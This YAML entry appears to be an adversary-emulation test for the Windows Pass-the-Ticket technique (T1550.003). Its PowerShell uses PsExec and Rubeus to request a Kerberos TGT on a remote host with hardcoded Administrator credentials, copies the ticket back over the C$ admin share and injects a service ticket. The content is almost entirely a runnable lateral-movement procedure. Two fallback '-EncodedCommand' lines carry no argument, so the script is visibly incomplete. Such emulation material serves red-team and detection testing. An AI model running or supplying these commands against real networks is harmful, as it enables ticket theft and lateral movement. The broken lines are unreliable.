- id: abfd73c4-53bd-5ccb-9f07-ef7aea5ce878
  name: Soumaia ART Tests - Rubeus Kerberos Pass The Ticket
  description: 'Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).

    PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met. (requires elevation)'
  tactic: lateral-movement
  technique:
    attack_id: T1550.003
    name: 'Use Alternate Authentication Material: Pass the Ticket'
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXAByAHUAYgBlAHUAcwAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAHMARQB4AGUAYwAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand 
          }
          & "$env:TEMP\ART-ExternalPayloads\PsExec.exe" -accepteula \\localhost -w c:\ -c "$env:TEMP\ART-ExternalPayloads\rubeus.exe" asktgt /user:Administrator /password:Password /domain:$Env:USERDOMAIN /outfile:ticket.kirbi
          Set-Location "$env:TEMP\ART-ExternalPayloads"
          Move-Item -Force "\\localhost\c$\ticket.kirbi" ticket.kirbi
          Write-Host "Successfully retrieved TGT from 'localhost', now requesting a TGS from local"
          & "$env:TEMP\ART-ExternalPayloads\rubeus.exe" asktgs /service:cifs/localhost /ticket:ticket.kirbi /ptt
          Remove-Item "$env:TEMP\ART-ExternalPayloads\ticket.kirbi"
          & "$env:TEMP\ART-ExternalPayloads\rubeus.exe" purge
